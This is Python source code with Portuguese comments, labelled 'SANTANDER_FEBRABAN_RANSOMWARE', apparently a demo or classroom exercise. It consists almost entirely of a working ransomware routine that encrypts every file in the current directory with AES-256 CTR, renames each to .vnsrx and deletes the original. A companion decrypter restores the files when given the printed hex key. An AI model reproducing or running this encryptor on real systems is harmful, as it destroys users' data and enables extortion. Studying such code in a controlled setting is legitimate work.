# SANTANDER_FEBRABAN_RANSOMWARE

import os
import pyaes
import os
import random
import string

def generate_random_key(length=32):
   """Gera uma chave aleatória de bytes usando os.urandom para segurança criptográfica."""
   return os.urandom(length)

def encrypt_file(file_name, key):
   # Lê os dados do arquivo
   with open(file_name, "rb") as file:
       file_data = file.read()

   # Cria um objeto AES com AES-256
   aes = pyaes.AESModeOfOperationCTR(key)

   # Criptografa os dados
   encrypted_data = aes.encrypt(file_data)

   # Salva os dados criptografados em um novo arquivo com a extensão .vnsrx
   new_file_name = file_name + ".vnsrx"
   with open(new_file_name, "wb") as file:
       file.write(encrypted_data)

   print(f"Arquivo {file_name} criptografado com sucesso e salvo como {new_file_name}!")

   # Verifica se o arquivo criptografado foi criado com sucesso
   if os.path.isfile(new_file_name):
       # Remove o arquivo original
       os.remove(file_name)
       print(f"Arquivo original {file_name} foi removido.")
   else:
       print(f"Erro: O arquivo criptografado {new_file_name} não foi criado. O arquivo original não será removido.")

def main():
   # Gera uma chave aleatória de 32 bytes
   key = generate_random_key(32)

   print(f"Chave gerada: {key.hex()}")  # Exibe a chave em formato hexadecimal

   # Nome do arquivo do script
   script_name = os.path.basename(__file__)

   # Lista todos os arquivos no diretório atual
   for file_name in os.listdir('.'):
       # Ignora diretórios, arquivos já criptografados e o próprio script
       if os.path.isfile(file_name) and not file_name.endswith('.vnsrx') and file_name != script_name:
           encrypt_file(file_name, key)

   print("Todos os arquivos foram criptografados.")

if __name__ == "__main__":
   main()
DECRYPTER

import os
import pyaes

def decrypt_file(file_name, key):
   # Lê os dados do arquivo criptografado
   with open(file_name, "rb") as file:
       encrypted_data = file.read()

   # Cria um objeto AES
   aes = pyaes.AESModeOfOperationCTR(key)

   # Descriptografa os dados
   decrypted_data = aes.decrypt(encrypted_data)

   # Salva os dados descriptografados em um novo arquivo sem a extensão .vnsrx
   new_file_name = file_name.replace('.vnsrx', '')
   with open(new_file_name, "wb") as file:
       file.write(decrypted_data)

   print(f"Arquivo {file_name} descriptografado com sucesso e salvo como {new_file_name}!")

   # Verifica se o arquivo descriptografado foi criado com sucesso
   if os.path.isfile(new_file_name):
       # Remove o arquivo criptografado
       os.remove(file_name)
       print(f"Arquivo criptografado {file_name} foi removido.")
   else:
       print(f"Erro: O arquivo descriptografado {new_file_name} não foi criado. O arquivo criptografado não será removido.")

def main():
   # Solicita ao usuário que insira a chave de descriptografia em formato hexadecimal
   key_hex = input("Digite a chave de descriptografia em formato hexadecimal (64 caracteres): ").strip()

   # Verifica se a chave tem exatamente 64 caracteres (32 bytes em hexadecimal)
   if len(key_hex) != 64:
       print("A chave deve ter exatamente 64 caracteres em formato hexadecimal.")
       return

   # Converte a chave de hexadecimal para bytes
   key = bytes.fromhex(key_hex)

   # Lista todos os arquivos no diretório atual
   for file_name in os.listdir('.'):
       # Verifica se o arquivo é criptografado
       if os.path.isfile(file_name) and file_name.endswith('.vnsrx'):
           decrypt_file(file_name, key)

   print("Todos os arquivos criptografados foram descriptografados e removidos.")

if __name__ == "__main__":
   main()
ARQUIVO MODELO
